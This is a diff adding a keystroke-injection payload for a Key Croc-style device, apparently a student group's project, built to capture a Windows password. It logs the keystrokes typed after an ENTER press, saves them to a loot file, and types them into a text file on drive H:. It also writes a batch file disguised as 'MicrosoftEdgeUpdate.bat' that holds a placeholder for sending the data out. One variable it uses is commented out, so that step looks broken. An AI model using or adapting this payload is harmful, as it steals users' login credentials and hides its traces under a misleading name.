@@ -1,0 +1,76 @@
+# Key croc payload to sniff and store user password (windows)
+
+# Written by:
+# - Prince Samuel Kyeremanteng
+# - Hadar Eklund
+# - Group 24.
+
+
+[ -f /tmp/creds_lock ] && exit 0
+touch /tmp/creds_lock
+
+mkdir -p /root/loot
+
+
+
+MATCH \[ENTER\]
+
+rm -f /root/loot/*
+
+
+Q DELAY 1000
+
+#Q GUI r
+#Q DELAY 600
+#Q STRING runas /user:$RUNAS_USER cmd
+#Q ENTER
+#Q DELAY 1200
+
+SAVEKEYS /root/loot/win-pass.txt NEXT 18
+
+
+Q DELAY 10000
+
+
+#CLEAN_KEYS=$(sed 's/\[[A-Z_0-9]\{2,\}\]//g' /root/loot/win-pass.txt | tr -d '[]' | tr -d '\n\r')
+
+Q DELAY 2000
+Q GUI r
+Q DELAY 600
+Q STRING notepad H:password.txt
+Q ENTER
+Q DELAY 1200
+Q ENTER
+Q DELAY 800
+Q STRING ${CLEAN_KEYS}
+Q DELAY 300
+Q CTRL-SHIFT s
+Q DELAY 500
+Q ALT F4
+Q ALT F4
+
+
+
+Q DELAY 1500
+Q GUI r
+Q DELAY 600
+Q STRING cmd
+Q ENTER
+Q DELAY 400
+Q STRING cd H:
+Q ENTER
+Q DELAY 200
+Q STRING cd Desktop
+Q ENTER
+Q DELAY 200
+Q STRING powershell
+Q DELAY 600
+Q ENTER
+Q DELAY 600
+Q STRING Set-Content -Path 'MicrosoftEdgeUpdate.bat' -Value ThisCouldBeSSHorPOST
+Q ENTER
+Q DELAY 200
+Q STRING exit
+Q ENTER
+
+Q DELAY 1000
